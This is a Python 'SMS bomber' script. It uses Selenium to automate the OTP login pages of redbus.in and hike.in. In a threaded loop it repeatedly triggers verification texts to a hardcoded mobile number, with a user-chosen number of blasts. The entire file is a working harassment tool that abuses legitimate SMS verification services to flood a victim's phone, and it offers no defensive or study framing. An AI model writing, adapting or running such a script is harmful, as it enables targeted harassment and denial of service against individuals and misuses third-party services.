from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import os
import time

from threading import Thread

chrome_options = Options()
#chrome_options.add_argument("--headless")

path = '/Users/ssvighnesh/chromedriver'

def redbus_blast(mobile_no):

    driver = webdriver.Chrome(path, chrome_options=chrome_options)
    driver.get("https://www.redbus.in/account?pageName=Home&noReload=noReload")

    mobile_input = driver.find_element_by_id("mobileNoInp")
    mobile_input.clear()
    mobile_input.send_keys(mobile_no)

    element = driver.find_element_by_class_name("otpContainer")
    driver.execute_script("arguments[0].click();", element)

    element = driver.find_element_by_class_name("resendOtpContainer")
    driver.execute_script("arguments[0].click();", element)
    print('redbus' )
    driver.close()


def hike_blast(mobile_no):

    driver = webdriver.Chrome(executable_path=path, chrome_options=chrome_options)
    driver.get("https://hike.in/")

    mobile_input = driver.find_element_by_id("number-input")
    mobile_input.clear()
    mobile_input.send_keys(mobile_no)

    element = driver.find_element_by_xpath("//div[@onclick='sendSMS(this)']")
    driver.execute_script("arguments[0].click();", element)

    print('hike')

    driver.close()



# seconds = float(input('Enter delay: '))
seconds=1
# mobile_no = input('Enter mobile number: ')
mobile_no= 9884026065

bomb_count = int(input('Enter number of sms blasts: '))
thread_list=[]
for i in range(bomb_count):
    t1 = Thread(target=hike_blast, args=[mobile_no])
    t2 = Thread(target=redbus_blast, args=[mobile_no])
    t1.start()
    t2.start()
    thread_list.append(t1)
    thread_list.append(t2)
    time.sleep(seconds)
